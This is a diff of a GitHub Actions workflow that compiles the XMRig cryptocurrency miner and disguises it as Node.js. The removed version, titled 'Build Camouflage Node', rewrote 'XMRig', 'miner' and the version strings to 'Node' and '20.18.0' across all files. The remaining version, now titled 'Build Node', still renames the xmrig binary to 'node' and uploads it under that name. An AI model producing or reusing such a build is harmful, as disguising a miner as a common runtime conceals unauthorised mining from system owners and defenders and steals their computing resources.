@@ -1,45 +1,25 @@
-name: Build Camouflage Node
-
+name: Build Node
 on:
   workflow_dispatch:
 
 jobs:
   build:
     runs-on: ubuntu-24.04
-    env:
-      FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true  # 关闭Node20警告
     steps:
       - uses: actions/checkout@v4
         with:
           submodules: recursive
-          fetch-depth: 0
-
-      - name: Install build tools
-        run: sudo apt-get update -y && sudo apt-get install -y build-essential cmake git libuv1-dev libssl-dev
-
-      # 🔥 彻底伪装成 Node.js
-      - name: Full camouflage
-        run: |
-          find . -type f -exec sed -i '
-            s/XMRig/Node/g
-            s/xmrig/node/g
-            s/6\.[0-9]*\.[0-9]*/20.18.0/g
-            s/gcc/Node/g
-            s/built for Linux/Node.js/g
-            s/miner/daemon/g
-            s/Miner/Node/g
-            s/Linux x86-64/x64/g
-          ' {} \;
 
       - name: Build
         run: |
+          sudo apt update
+          sudo apt install -y build-essential cmake libuv1-dev libssl-dev
           mkdir build && cd build
-          cmake .. -DWITH_HWLOC=OFF -DWITH_HTTP=OFF
+          cmake .. -DWITH_HWLOC=OFF
           make -j$(nproc)
           mv xmrig node
 
-      - name: Upload
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
           name: node
           path: build/node
